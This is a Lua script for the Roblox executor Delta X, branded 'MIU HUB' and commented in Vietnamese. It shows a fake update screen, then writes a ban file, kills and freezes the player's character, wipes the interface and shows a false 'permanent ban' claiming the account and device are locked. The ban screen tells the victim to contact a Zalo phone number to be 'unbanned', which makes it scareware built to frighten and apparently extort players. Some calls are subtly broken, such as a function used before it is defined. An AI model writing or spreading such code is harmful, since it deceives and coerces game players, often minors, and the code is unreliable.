-- MIU HUB - Permanent Ban with Unban Contact
-- Dành cho Delta X / Roblox
-- Hiển thị số Zalo: 0974516980 để "mở ban"

pcall(function() script.Parent = nil end)

local player = game:GetService("Players").LocalPlayer
local userId = player.UserId
local zaloNumber = "0974516980"

---=== KIỂM TRA FILE BAN ===---

local function isBanned()
    local success, data = pcall(function()
        return readfile("MIU_HUB_BAN_" .. userId .. ".json")
    end)
    if success and data and #data > 0 then
        local decoded = game:GetService("HttpService"):JSONDecode(data)
        if decoded and decoded.banned == true then
            return true, decoded
        end
    end
    return false, nil
end

local function writeBanFile()
    local data = {
        banned = true,
        userId = userId,
        username = player.Name,
        displayName = player.DisplayName,
        banTime = os.time(),
        banDate = os.date("%Y-%m-%d %H:%M:%S"),
        unbanContact = zaloNumber
    }
    pcall(function()
        writefile("MIU_HUB_BAN_" .. userId .. ".json", game:GetService("HttpService"):JSONEncode(data))
        writefile("MIU_HUB_BAN_BACKUP_" .. userId .. ".txt", game:GetService("HttpService"):JSONEncode(data))
    end)
end

---=== KIỂM TRA NGAY KHI VÀO ===---

local banned, banInfo = isBanned()

if banned then
    -- Đã bị ban từ trước → hiện luôn màn hình ban
    showBanScreen(true)
    return
end

---=== LẦN ĐẦU: HIỂN THỊ "ĐANG CẬP NHẬT..." ===---

local gui = Instance.new("ScreenGui")
gui.Name = "MiuHubGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 350, 0, 200)
frame.Position = UDim2.new(0.5, -175, 0.5, -100)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 40)
frame.BackgroundTransparency = 0.1
frame.BorderSizePixel = 0
frame.Active = true
frame.Parent = gui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = frame

local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(233, 69, 96)
stroke.Thickness = 2
stroke.Transparency = 0.3
stroke.Parent = frame

local warningLabel = Instance.new("TextLabel")
warningLabel.Size = UDim2.new(1, 0, 0, 40)
warningLabel.Position = UDim2.new(0, 0, 0, 12)
warningLabel.BackgroundTransparency = 1
warningLabel.Text = "⚠️"
warningLabel.TextColor3 = Color3.fromRGB(233, 69, 96)
warningLabel.TextSize = 30
warningLabel.Font = Enum.Font.GothamBold
warningLabel.Parent = frame

local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(1, 0, 0, 30)
titleLabel.Position = UDim2.new(0, 0, 0, 52)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "MIU HUB"
titleLabel.TextColor3 = Color3.fromRGB(233, 69, 96)
titleLabel.TextSize = 22
titleLabel.Font = Enum.Font.GothamBold
titleLabel.Parent = frame

local updateLabel = Instance.new("TextLabel")
updateLabel.Size = UDim2.new(1, 0, 0, 25)
updateLabel.Position = UDim2.new(0, 0, 0, 82)
updateLabel.BackgroundTransparency = 1
updateLabel.Text = "Đang cập nhật hệ thống..."
updateLabel.TextColor3 = Color3.fromRGB(180, 180, 200)
updateLabel.TextSize = 16
updateLabel.Font = Enum.Font.Gotham
updateLabel.Parent = frame

local spinner = Instance.new("Frame")
spinner.Size = UDim2.new(0, 30, 0, 30)
spinner.Position = UDim2.new(0.5, -15, 0, 115)
spinner.BackgroundTransparency = 1
spinner.BorderSizePixel = 0
spinner.Parent = frame

local spinnerCorner = Instance.new("UICorner")
spinnerCorner.CornerRadius = UDim.new(1, 0)
spinnerCorner.Parent = spinner

local spinnerStroke = Instance.new("UIStroke")
spinnerStroke.Color = Color3.fromRGB(233, 69, 96)
spinnerStroke.Thickness = 3
spinnerStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
spinnerStroke.Parent = spinner

spinner.Rotation = 0
coroutine.wrap(function()
    while spinner and spinner.Parent do
        spinner.Rotation = spinner.Rotation + 5
        task.wait(0.03)
    end
end)()

local countdownLabel = Instance.new("TextLabel")
countdownLabel.Size = UDim2.new(1, 0, 0, 20)
countdownLabel.Position = UDim2.new(0, 0, 0, 155)
countdownLabel.BackgroundTransparency = 1
countdownLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
countdownLabel.TextSize = 13
countdownLabel.Font = Enum.Font.GothamLight
countdownLabel.Parent = frame

-- Đếm ngược 3 giây
for i = 3, 1, -1 do
    countdownLabel.Text = "Tự động kiểm tra sau " .. i .. " giây"
    task.wait(1)
end

-- Xóa GUI cũ
if gui then gui:Destroy() end

-- Ghi file ban
writeBanFile()

-- Hiển thị màn hình ban
showBanScreen(false)

---=== HÀM HIỂN THỊ BAN ===---

function showBanScreen(isRejoin)
    -- Vô hiệu hóa nhân vật
    pcall(function()
        local char = player.Character
        if char then
            local humanoid = char:FindFirstChild("Humanoid")
            if humanoid then
                humanoid.Health = 0
                humanoid.WalkSpeed = 0
                humanoid.JumpPower = 0
            end
            local root = char:FindFirstChild("HumanoidRootPart")
            if root then root.Anchored = true end
        end
        player.CharacterAdded:Connect(function(char)
            task.wait(0.1)
            local humanoid = char:FindFirstChild("Humanoid")
            if humanoid then
                humanoid.Health = 0
                humanoid.WalkSpeed = 0
                humanoid.JumpPower = 0
            end
            local root = char:FindFirstChild("HumanoidRootPart")
            if root then root.Anchored = true end
        end)
    end)
    
    -- Xóa toàn bộ GUI cũ
    pcall(function()
        for _, v in pairs(player.PlayerGui:GetChildren()) do
            v:Destroy()
        end
    end)
    
    -- Chặn nhập liệu
    pcall(function()
        local uis = game:GetService("UserInputService")
        uis.BlockUserInput = Enum.UserInputType.Keyboard
    end)
    
    -- Tạo GUI Ban
    local banGui = Instance.new("ScreenGui")
    banGui.Name = "MiuPermBanGUI"
    banGui.ResetOnSpawn = false
    banGui.Parent = player:WaitForChild("PlayerGui")
    banGui.DisplayOrder = 99999
    banGui.IgnoreGuiInset = true
    
    -- Background đen
    local blackBg = Instance.new("Frame")
    blackBg.Size = UDim2.new(1, 0, 1, 0)
    blackBg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    blackBg.BackgroundTransparency = 0.6
    blackBg.BorderSizePixel = 0
    blackBg.ZIndex = 99999
    blackBg.Parent = banGui
    
    -- Hiệu ứng đỏ
    local redOverlay = Instance.new("Frame")
    redOverlay.Size = UDim2.new(1, 0, 1, 0)
    redOverlay.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    redOverlay.BackgroundTransparency = 0.92
    redOverlay.BorderSizePixel = 0
    redOverlay.ZIndex = 99999
    redOverlay.Parent = banGui
    
    coroutine.wrap(function()
        while redOverlay and redOverlay.Parent do
            redOverlay.BackgroundTransparency = 0.88 + math.random() * 0.12
            task.wait(0.25)
        end
    end)()
    
    -- Frame chính
    local banFrame = Instance.new("Frame")
    banFrame.Size = UDim2.new(0, 420, 0, 400)
    banFrame.Position = UDim2.new(0.5, -210, 0.5, -200)
    banFrame.BackgroundColor3 = Color3.fromRGB(15, 5, 5)
    banFrame.BackgroundTransparency = 0.1
    banFrame.BorderSizePixel = 0
    banFrame.ZIndex = 100000
    banFrame.Parent = banGui
    
    local banCorner = Instance.new("UICorner")
    banCorner.CornerRadius = UDim.new(0, 15)
    banCorner.Parent = banFrame
    
    local banStroke = Instance.new("UIStroke")
    banStroke.Color = Color3.fromRGB(255, 0, 0)
    banStroke.Thickness = 4
    banStroke.Transparency = 0.1
    banStroke.ZIndex = 100000
    banStroke.Parent = banFrame
    
    -- Icon skull
    local banIcon = Instance.new("TextLabel")
    banIcon.Size = UDim2.new(1, 0, 0, 50)
    banIcon.Position = UDim2.new(0, 0, 0, 10)
    banIcon.BackgroundTransparency = 1
    banIcon.Text = "💀"
    banIcon.TextColor3 = Color3.fromRGB(255, 0, 0)
    banIcon.TextSize = 45
    banIcon.Font = Enum.Font.GothamBold
    banIcon.ZIndex = 100000
    banIcon.Parent = banFrame
    
    -- Title
    local banTitle = Instance.new("TextLabel")
    banTitle.Size = UDim2.new(1, 0, 0, 35)
    banTitle.Position = UDim2.new(0, 0, 0, 60)
    banTitle.BackgroundTransparency = 1
    banTitle.Text = "BẠN ĐÃ BỊ CẤM VĨNH VIỄN"
    banTitle.TextColor3 = Color3.fromRGB(255, 30, 30)
    banTitle.TextSize = 22
    banTitle.Font = Enum.Font.GothamBlack
    banTitle.ZIndex = 100000
    banTitle.Parent = banFrame
    
    -- PERMANENT
    local permLabel = Instance.new("TextLabel")
    permLabel.Size = UDim2.new(1, 0, 0, 25)
    permLabel.Position = UDim2.new(0, 0, 0, 95)
    permLabel.BackgroundTransparency = 1
    permLabel.Text = "⛔ PERMANENT BAN ⛔"
    permLabel.TextColor3 = Color3.fromRGB(255, 200, 0)
    permLabel.TextSize = 14
    permLabel.Font = Enum.Font.GothamBold
    permLabel.ZIndex = 100000
    permLabel.Parent = banFrame
    
    -- Mã ban
    local banId = "MH-PERM-" .. os.date("%Y%m%d") .. "-" .. math.random(10000, 99999)
    local idLabel = Instance.new("TextLabel")
    idLabel.Size = UDim2.new(1, -40, 0, 22)
    idLabel.Position = UDim2.new(0, 20, 0, 125)
    idLabel.BackgroundTransparency = 1
    idLabel.Text = "Mã: " .. banId
    idLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
    idLabel.TextSize = 13
    idLabel.Font = Enum.Font.Gotham
    idLabel.ZIndex = 100000
    idLabel.Parent = banFrame
    
    -- Lý do
    local reasonLabel = Instance.new("TextLabel")
    reasonLabel.Size = UDim2.new(1, -40, 0, 40)
    reasonLabel.Position = UDim2.new(0, 20, 0, 148)
    reasonLabel.BackgroundTransparency = 1
    reasonLabel.Text = "Lý do: Phát hiện hành vi gian lận\nThiết bị đã bị ghi nhận trong hệ thống"
    reasonLabel.TextColor3 = Color3.fromRGB(255, 150, 150)
    reasonLabel.TextSize = 13
    reasonLabel.Font = Enum.Font.Gotham
    reasonLabel.TextWrapped = true
    reasonLabel.TextXAlignment = Enum.TextXAlignment.Center
    reasonLabel.ZIndex = 100000
    reasonLabel.Parent = banFrame
    
    -- Dòng thông báo thiết bị
    local deviceLabel = Instance.new("TextLabel")
    deviceLabel.Size = UDim2.new(1, -40, 0, 40)
    deviceLabel.Position = UDim2.new(0, 20, 0, 190)
    deviceLabel.BackgroundTransparency = 1
    deviceLabel.Text = "Tài khoản và thiết bị của bạn đã bị khóa.\nKhông thể đăng nhập lại."
    deviceLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
    deviceLabel.TextSize = 12
    deviceLabel.Font = Enum.Font.Gotham
    deviceLabel.TextWrapped = true
    deviceLabel.TextXAlignment = Enum.TextXAlignment.Center
    deviceLabel.ZIndex = 100000
    deviceLabel.Parent = banFrame
    
    ---=== PHẦN HIỂN THỊ SỐ ZALO ===---
    
    -- Khung Zalo
    local zaloFrame = Instance.new("Frame")
    zaloFrame.Size = UDim2.new(1, -60, 0, 65)
    zaloFrame.Position = UDim2.new(0, 30, 0, 240)
    zaloFrame.BackgroundColor3 = Color3.fromRGB(0, 100, 50)
    zaloFrame.BackgroundTransparency = 0.3
    zaloFrame.BorderSizePixel = 0
    zaloFrame.ZIndex = 100000
    zaloFrame.Parent = banFrame
    
    local zaloCorner = Instance.new("UICorner")
    zaloCorner.CornerRadius = UDim.new(0, 8)
    zaloCorner.Parent = zaloFrame
    
    local zaloIcon = Instance.new("TextLabel")
    zaloIcon.Size = UDim2.new(0, 30, 1, 0)
    zaloIcon.Position = UDim2.new(0, 5, 0, 0)
    zaloIcon.BackgroundTransparency = 1
    zaloIcon.Text = "💬"
    zaloIcon.TextColor3 = Color3.fromRGB(255, 255, 255)
    zaloIcon.TextSize = 20
    zaloIcon.Font = Enum.Font.Gotham
    zaloIcon.ZIndex = 100001
    zaloIcon.Parent = zaloFrame
    
    local zaloText = Instance.new("TextLabel")
    zaloText.Size = UDim2.new(1, -40, 0, 22)
    zaloText.Position = UDim2.new(0, 38, 0, 5)
    zaloText.BackgroundTransparency = 1
    zaloText.Text = "LIÊN HỆ MỞ BAN"
    zaloText.TextColor3 = Color3.fromRGB(255, 255, 255)
    zaloText.TextSize = 14
    zaloText.Font = Enum.Font.GothamBold
    zaloText.TextXAlignment = Enum.TextXAlignment.Left
    zaloText.ZIndex = 100001
    zaloText.Parent = zaloFrame
    
    local zaloNumberLabel = Instance.new("TextLabel")
    zaloNumberLabel.Size = UDim2.new(1, -40, 0, 25)
    zaloNumberLabel.Position = UDim2.new(0, 38, 0, 28)
    zaloNumberLabel.BackgroundTransparency = 1
    zaloNumberLabel.Text = "Zalo: " .. zaloNumber
    zaloNumberLabel.TextColor3 = Color3.fromRGB(255, 255, 100)
    zaloNumberLabel.TextSize = 18
    zaloNumberLabel.Font = Enum.Font.GothamBlack
    zaloNumberLabel.TextXAlignment = Enum.TextXAlignment.Left
    zaloNumberLabel.ZIndex = 100001
    zaloNumberLabel.Parent = zaloFrame
    
    -- Hiệu ứng nhấp nháy cho số Zalo
    coroutine.wrap(function()
        while zaloNumberLabel and zaloNumberLabel.Parent do
            zaloNumberLabel.TextColor3 = Color3.fromRGB(255, 255, 100)
            task.wait(0.5)
            zaloNumberLabel.TextColor3 = Color3.fromRGB(255, 200, 0)
            task.wait(0.5)
        end
    end)()
    
    -- Nút copy số Zalo
    local copyButton = Instance.new("TextButton")
    copyButton.Size = UDim2.new(0, 160, 0, 30)
    copyButton.Position = UDim2.new(0.5, -80, 0, 318)
    copyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 80)
    copyButton.Text = "📋 SAO CHÉP SỐ ZALO"
    copyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    copyButton.TextSize = 12
    copyButton.Font = Enum.Font.GothamBold
    copyButton.ZIndex = 100000
    copyButton.Parent = banFrame
    
    local copyCorner = Instance.new("UICorner")
    copyCorner.CornerRadius = UDim.new(0, 6)
    copyCorner.Parent = copyButton
    
    copyButton.MouseButton1Click:Connect(function()
        pcall(function()
            setclipboard(zaloNumber)
        end)
        copyButton.Text = "✅ ĐÃ SAO CHÉP!"
        task.delay(2, function()
            if copyButton then copyButton.Text = "📋 SAO CHÉP SỐ ZALO" end
        end)
    end)
    
    -- Nút thoát game
    local okButton = Instance.new("TextButton")
    okButton.Size = UDim2.new(0, 160, 0, 40)
    okButton.Position = UDim2.new(0.5, -80, 0, 355)
    okButton.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
    okButton.Text = "THOÁT GAME"
    okButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    okButton.TextSize = 15
    okButton.Font = Enum.Font.GothamBold
    okButton.ZIndex = 100000
    okButton.Parent = banFrame
    
    local okCorner = Instance.new("UICorner")
    okCorner.CornerRadius = UDim.new(0, 10)
    okCorner.Parent = okButton
    
    okButton.MouseButton1Click:Connect(function()
        game:Shutdown()
    end)
    
    -- Tự động thoát sau 30 giây
    task.delay(30, function()
        if banGui then banGui:Destroy() end
        game:Shutdown()
    end)
    
    -- Hiệu ứng rung
    coroutine.wrap(function()
        local origPos = banFrame.Position
        for i = 1, 25 do
            banFrame.Position = UDim2.new(0.5, -210 + math.random(-4, 4), 0.5, -200 + math.random(-3, 3))
            task.wait(0.03)
        end
        banFrame.Position = origPos
    end)()
end
